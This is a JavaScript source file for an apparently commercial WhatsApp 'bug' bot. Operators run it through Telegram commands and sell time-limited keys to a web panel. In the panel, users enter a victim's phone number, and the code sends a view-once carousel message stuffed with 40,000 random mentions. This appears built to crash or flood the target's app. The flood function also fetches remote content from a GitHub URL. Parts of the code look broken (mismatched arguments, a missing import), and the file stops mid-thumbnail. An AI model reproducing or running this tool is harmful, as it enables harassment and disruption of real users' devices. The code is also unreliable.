// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
} = require('lotusbail');

// ==================== CONFIGURATION ==================== //
const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //

// Access control functions
function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

/*function saveAkses(data) {
  const normalized = {
    owners: data.owners.map(id => id.toString()),
    akses: data.akses.map(id => id.toString())
  };
  fs.writeFileSync(file, JSON.stringify(normalized, null, 2));
}*/

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

// Key generation functions
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// User management functions
function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "SNITBAIL");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

// ==================== BOT COMMANDS ==================== //

// Start command
bot.command("start", (ctx) => {
  const teks = `( 🍁 ) ─── ❖ 情報 ❖  
𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 × 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺  
─── 革命的な自動化システム ───  
高速・柔軟性・絶対的な安全性を備えた 次世代ボットが今、覚醒する。

〢「 𝐗𝐈𝐒 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
 ࿇ Author : —!s SaturnXapi
 ࿇ Type : ( Case─Plugins )
 ࿇ League : Asia/Indonesia-
┌─────────
├──── ▢ ( 𖣂 ) Sender Handler
├── ▢ owner users
│── /connect — <nomor>
│── /listsender —
│── /delsender — <nomor>
└────
┌─────────
├──── ▢ ( 𖣂 ) Key Manager
├── ▢ admin users
│── /ckey — <username,durasi>
│── /listkey —
│── /delkey — <username>
└────
┌─────────
├──── ▢ ( 𖣂 ) Access Controls
├── ▢ owner users
│── /addacces — <user/id>
│── /delacces — <user/id>
│── /addowner — <user/id>
│── /delowner — <user/id>
└────`;
  ctx.replyWithMarkdown(teks);
});

// Sender management commands
bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /connect Number_\n_Example : /connect 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delsender Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// Key management commands
bot.command("ckey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!args || !args.includes(",")) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /ckey User,Day\n_Example : /ckey rizxz,30d", { parse_mode: "Markdown" });
  }

  const [username, durasiStr] = args.split(",");
  const durationMs = parseDuration(durasiStr.trim());
  if (!durationMs) return ctx.reply("❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  ctx.replyWithMarkdown(`✅ *Key berhasil dibuat:*\n\n*Username:* \`${username}\`\n*Key:* \`${key}\`\n*Expired:* _${expiredStr}_ WIB`);
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey rizxvelz");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// Access control commands
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
╭╮╱╭┳━━━┳━━━┳━━━┳╮╱╱╭━━━┳╮╭╮╭┳╮╭╮╭╮
┃┃╱┃┃╭━╮┃╭━╮┃╭━╮┃┃╱╱┃╭━╮┃┃┃┃┃┃┃┃┃┃┃
┃╰━╯┃┃╱┃┃╰━━┫┃╱╰┫┃╱╱┃┃╱┃┃┃┃┃┃┃┃┃┃┃┃
┃╭━╮┃╰━╯┣━━╮┃┃╱╭┫┃╱╭┫╰━╯┃╰╯╰╯┃╰╯╰╯┃
┃┃╱┃┃╭━╮┃╰━╯┃╰━╯┃╰━╯┃╭━╮┣╮╭╮╭┻╮╭╮╭╯
╰╯╱╰┻╯╱╰┻━━━┻━━━┻━━━┻╯╱╰╯╰╯╰╯╱╰╯╰╯⠀⠀⠀⠀⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT SATRUNX API 
├─ ID OWN : ${OwnerId}
├─ DEVOLOPER : RIZXVELZ
├─ BOT : CONNECTED ✅
╰───────────────────`));

initializeWhatsAppConnections();

// ==================== WEB SERVER ==================== //
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        MisteryHow(24, target);
      } else if (mode === "ios") {
        MisteryHow(24, target);
      } else if (mode === "andros-delay") {
        MisteryHow(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✅ Server aktif di port ${PORT}`);
});

// ==================== EXPORTS ==================== //
module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== FLOOD FUNCTIONS ==================== //
async function MisteryHow(target) {
  let ApiNewFC;
  try {
    const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
    ApiNewFC = await res.text(); // Fixed: Changed ApiKyami to ApiNewFC
  } catch (err) {
    console.error("error fetching", err);
    return;
  }

  const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
  
  const contextInfo = { // Added contextInfo definition
    mentionedJid: mentionedList,
    isForwarded: true,
    forwardingScore: 999,
    businessMessageForwardInfo: {
      businessOwnerJid: target,
    },
  };
  
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Viona Tes Bag',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "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